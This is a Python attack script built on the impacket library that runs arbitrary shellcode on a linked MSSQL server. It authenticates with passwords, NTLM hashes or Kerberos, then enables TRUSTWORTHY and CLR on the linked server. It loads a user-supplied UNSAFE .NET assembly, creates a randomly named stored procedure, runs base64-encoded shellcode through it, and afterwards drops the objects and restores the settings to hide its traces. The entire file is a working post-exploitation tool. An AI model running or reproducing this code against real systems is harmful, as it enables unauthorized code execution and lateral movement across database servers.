#!/usr/bin/env python3 
# -*- coding:utf-8 -*-
from __future__ import division
from __future__ import print_function
import argparse
import base64
import re
import sys
import random
import string
import logging

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import tds

if __name__ in '__main__':
    logger.init()
    parser = argparse.ArgumentParser( add_help = True, description = 'Executes arbitrary shellcode on an MSSQL linked server using Command Language Runtime Stored Procedures.' );
    parser.add_argument( 'target', action = 'store', help = '[[domain/]username[:password]@]<targetName or address>' );
    parser.add_argument( '-port', action = 'store', default = '1433', help = 'target MSSQL port (default 1433)' );
    parser.add_argument( '-link', action = 'store', metavar = 'computer name', help = 'Linked MSSQL server to target.', required = True );
    parser.add_argument( '-db', action = 'store', help = 'MSSQL database to load stored procedure into on the remote link', default = 'master' );
    parser.add_argument( '-windows-auth', action = 'store_true', default = False, help = 'whether or not use to Windows Authentication (default False)' );
    parser.add_argument( '-debug', action = 'store_true', help = 'Turn DEBUG output ON' );
    group = parser.add_argument_group( 'payload' );
    group.add_argument( '-shellcode', action = 'store', metavar = 'file', required = True, type = argparse.FileType( 'rb+' ), help = 'Path to a shellcode to execute.' );
    group.add_argument( '-clr', action = 'store', metavar = 'file', required = True, type = argparse.FileType( 'rb+' ), help = 'Path to a .NET CLR to use.' );
    group = parser.add_argument_group( 'authentication' );
    group.add_argument( '-hashes', action = 'store', metavar = 'LMHASH:NTHASH', help = 'NTLM hashes, format is LMHASH:NTHASH' );
    group.add_argument( '-no-pass', action = 'store_true', help = 'dont\'t ask for password (useful for -k)' );
    group.add_argument( '-k', action = 'store_true', help = 'Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line' );
    group.add_argument( '-aesKey', action = 'store', metavar = 'hex key', help = 'AES key to use for Kerberos Authentication (128 or 256 bits)' );
    group.add_argument( '-dc-ip', action = 'store', metavar = 'ip address', help = 'IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter' );


    if len( sys.argv ) == 1:
        parser.print_help( );
        sys.exit( 1 )

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel( logging.DEBUG );
    else:
        logging.getLogger().setLevel( logging.INFO );

    domain, username, password, address = parse_target( options.target );

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass( 'Password:' );

    if options.aesKey is not None:
        options.k = True

    # connect to sql server.
    sql = tds.MSSQL( address, int( options.port ) );
    sql.connect()

    ini_tst = False
    ini_clr = False
    new_tst = False
    new_clr = False
    str_clr = None

    try:
        if options.k is True:
            res = sql.kerberosLogin( options.db, username, password, domain, options.hashes, options.aesKey, kdcHost = options.dc_ip )
        else:
            res = sql.login( options.db, username, password, domain, options.hashes, options.windows_auth );

        # are we trustworthy ?
        sql.sql_query( "EXEC (' SELECT CASE is_trustworthy_on WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.databases WHERE name = ''{}'' ') AT [{}]".format( options.db, options.link ) );
        ini_tst = True if sql.rows[0][''] == b'ON' else False

        # is clr support enabled?
        sql.sql_query( "EXEC (' SELECT CASE value WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.configurations WHERE NAME = ''clr enabled'' ') AT [{}]".format( options.link ) );
        ini_clr = True if sql.rows[0][''] == b'ON' else False

        logging.info( '{} database is currently configured with trustworthy set to: {}'.format( options.db, ( 'OFF', 'ON' )[ ini_tst ] ) );
        logging.info( 'MSSQL server is currently configured with CLR support set to: {}'.format( ( 'OFF', 'ON' )[ ini_clr ] ) );

        # enable trustworthy setting
        if not ini_tst:
            sql.sql_query( "EXEC (' ALTER DATABASE [{}] SET TRUSTWORTHY ON ') AT [{}]".format( options.db, options.link ) );
            sql.sql_query( "EXEC (' SELECT CASE is_trustworthy_on WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.databases WHERE name = ''{}'' ') AT [{}]".format( options.db, options.link ) );
            new_tst = True if sql.rows[0][''] == b'ON' else False
        else: new_tst = True

        # enable clr support
        if not ini_clr:
            sql.sql_query( "EXEC (' EXEC sp_configure ''show advanced options'', 1 ') AT [{}]".format( options.link ) )
            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );
            sql.sql_query( "EXEC (' EXEC sp_configure ''clr enabled'', 1 ') AT [{}]".format( options.link ) );
            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );
            sql.sql_query( "EXEC (' SELECT CASE value WHEN 1 THEN ''ON'' ELSE ''OFF'' END FROM sys.configurations WHERE NAME = ''clr enabled'' ') AT [{}]".format( options.link ) );
            new_clr = True if sql.rows[0][''] == b'ON' else False
        else: new_clr = True

        # failure :( 
        if not new_tst:
            logging.error( 'could not enable trustworthy on the {} database'.format( options.db ) );
            raise SystemExit

        # failure :(
        if not new_clr:
            logging.error( 'could not enable clr support.' );
            raise SystemExit

        # create string names
        clr_raw = bytes( options.clr.read() )
        shc_raw = bytes( options.shellcode.read() )
        str_clr = ''.join( random.choice( string.ascii_lowercase ) for i in range( 12 ) )
        str_prc = ''.join( random.choice( string.ascii_lowercase ) for i in range( 12 ) )
        str_prm = ''.join( random.choice( string.ascii_lowercase ) for i in range( 12 ) )

        # create the CLR
        logging.info( 'Creating CLR {}'.format( str_clr ) );
        sql.sql_query( "EXEC (' CREATE ASSEMBLY [{}] AUTHORIZATION [dbo] FROM 0x{} WITH PERMISSION_SET = UNSAFE ') AT [{}]".format( str_clr, clr_raw.hex(), options.link ) );
        sql.printReplies();

        # create the procedure
        logging.info( 'Creating procedure {}'.format( str_prc ) );
        sql.sql_query( "EXEC (' CREATE PROCEDURE [dbo].[{}](@{} AS NVARCHAR(MAX)) AS EXTERNAL NAME [{}].[StoredProcedures].[ExecuteB64Payload] ') AT [{}]".format( str_prc, str_prm, str_clr, options.link ) );
        sql.printReplies();

        # execute shellcode
        logging.info( 'Execute user-supplied-shellcode of length {}'.format( len( shc_raw ) ) );
        sql.sql_query( "EXEC (' EXEC [dbo].[{}] ''{}'' ') AT [{}]".format( str_prc, base64.b64encode( shc_raw ).decode(), options.link ) );
        sql.printReplies();

        # delete the procedure
        logging.info( 'Deleting procedure {}'.format( str_prc ) );
        sql.sql_query( "EXEC (' DROP PROCEDURE [dbo].[{}] ') AT [{}]".format( str_prc, options.link ) );
        sql.printReplies();

        # delete the CLR
        logging.info( 'Deleting CLR {}'.format( str_clr ) );
        sql.sql_query( "EXEC (' DROP ASSEMBLY [{}] ') AT [{}]".format( str_clr, options.link ) );
        sql.printReplies();

        # remove trustworthy access
        if not ini_tst:
            logging.info( 'Removing trustworthy database attribute from {}'.format( options.db ) );
            sql.sql_query( "EXEC (' ALTER DATABASE [{}] SET TRUSTWORTHY {} ') AT [{}]".format( options.db, ( 'OFF', 'ON' )[ ini_tst ], options.link ) );

        # remove clr support
        if not ini_clr:
            logging.info( 'Removing clr enabled support from the mssql server.' );
            sql.sql_query( "EXEC (' EXEC sp_configure ''show advanced options'', 1 ') AT [{}]".format( options.link ) )
            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );
            sql.sql_query( "EXEC (' EXEC sp_configure ''clr enabled'', 0') AT [{}]".format( options.link ) );
            sql.sql_query( "EXEC (' RECONFIGURE ') AT [{}]".format( options.link ) );

    except Exception as e:
        logging.debug( 'Exception:', exc_info = True )
        logging.error( str( e ) );
        res = False

    sql.disconnect()
